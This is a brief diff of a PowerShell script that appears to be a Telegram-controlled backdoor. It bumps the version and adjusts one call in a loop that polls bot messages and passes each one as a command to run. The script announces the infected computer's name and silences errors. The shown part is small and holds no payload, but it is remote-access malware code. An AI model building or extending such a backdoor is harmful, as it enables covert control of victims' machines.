@@ -1,6 +1,6 @@
 clear
 $ErrorActionPreference = "SilentlyContinue"
-$version = "0.2"
+$version = "0.3"
 
 $banner = "    ____  _____ ____      ______     __                              
    / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -48,7 +48,7 @@ if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mens
 	while ($i -lt $l) {
 		$offset = $json.result[$i].update_id + 1
         $comando = $json.result[$i].message.text
-Test-Command -comando $comando -texto $texto -botkey $botkey -chat_id $chat_id -first_connect $first_connect -help $help
+test-command -comando $comando -texto $texto -botkey $botkey -chat_id $chat_id -help
    		$i++
 	}
 
